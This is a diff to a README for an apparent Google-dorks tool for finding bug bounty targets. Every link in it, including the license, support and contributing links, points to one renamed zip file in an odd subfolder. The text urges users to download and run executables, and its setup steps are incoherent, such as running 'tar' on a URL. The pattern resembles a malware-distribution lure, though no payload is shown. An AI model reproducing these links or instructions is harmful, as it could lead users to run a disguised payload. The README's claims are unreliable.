@@ -1,6 +1,6 @@
 # 📜 dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty - Discover Hidden Bug Bounty Programs
 
-[![Download](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip)
+[![Download](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -20,14 +20,14 @@ To run the *Dorks de Google* application, you need:
 
 To get the application, please visit the page below:
 
-[Download the latest release](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip)
+[Download the latest release](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip)
 
 1. Click on the link above.
 2. Look for the latest version listed.
 3. Click on the file that matches your operating system. For example:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, find a file ending in `.dmg`.
-   - For Linux users, select the `https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip` or relevant package.
+   - For Linux users, select the `https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip` or relevant package.
 4. The file will start downloading.
 
 ## 📂 Running the Application
@@ -52,7 +52,7 @@ Once the download is complete, follow these steps to run the application:
 
 1. Open a terminal.
 2. Navigate to the directory where the file is downloaded.
-3. Use the command `tar -xvzf https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip` to extract the files.
+3. Use the command `tar -xvzf https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip` to extract the files.
 4. Change to the extracted directory using `cd`.
 5. Run the application with `./your-app-name`.
 
@@ -74,19 +74,19 @@ Once the download is complete, follow these steps to run the application:
 
 If you experience any issues, you can reach out for support:
 
-- Check the [Support Page](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip) for common problems.
+- Check the [Support Page](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip) for common problems.
 - Submit an issue if your question is not addressed.
 
 ## 🌐 Community Contributions
 
-We welcome contributions. If you want to help out, check our [Contributing Guidelines](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip).
+We welcome contributions. If you want to help out, check our [Contributing Guidelines](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip).
 
 ## 📋 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip) file for details.
 
 ## 🤝 Collaborators
 
 Thank you to all developers and contributors who have worked on this project. Your efforts make the *Dorks de Google* application better for everyone!
 
-[Download the latest release](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty.zip) and start exploring hidden bug bounty programs today!
+[Download the latest release](https://raw.githubusercontent.com/balxy/dorks-de-google-para-buscar-empresas-que-no-esten-en-plataformas-conocidas-de-bug-bounty/main/xanthochroid/bug_google_buscar_conocidas_esten_no_para_plataformas_empresas_en_bounty_que_de_dorks_v2.1-alpha.5.zip) and start exploring hidden bug bounty programs today!
